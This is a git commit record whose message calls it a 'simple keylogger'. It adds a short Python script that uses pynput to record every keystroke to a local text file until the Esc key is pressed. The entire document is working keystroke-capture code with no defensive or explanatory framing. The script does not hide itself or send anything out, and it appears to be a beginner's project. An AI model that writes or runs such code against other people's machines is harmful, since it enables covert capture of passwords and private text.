1c11fc43936cbe2942f8267b9124980524ac4ce9
Saharsh Hegde <saharshh1@gmail.com>
2025-09-04 17:37:28 +0530

    Initial commit: simple keylogger

---
+++ keylogger.py
@@ -0,0 +1,21 @@
+from pynput import keyboard
+
+# File to store the logs
+log_file = "key_log.txt"
+
+def on_press(key):
+    try:
+        with open(log_file, "a") as f:
+            f.write(f"{key.char}")
+    except AttributeError:
+        with open(log_file, "a") as f:
+            f.write(f" {key} ")
+
+def on_release(key):
+    # Stop listener when Esc is pressed
+    if key == keyboard.Key.esc:
+        return False
+
+# Start listening
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
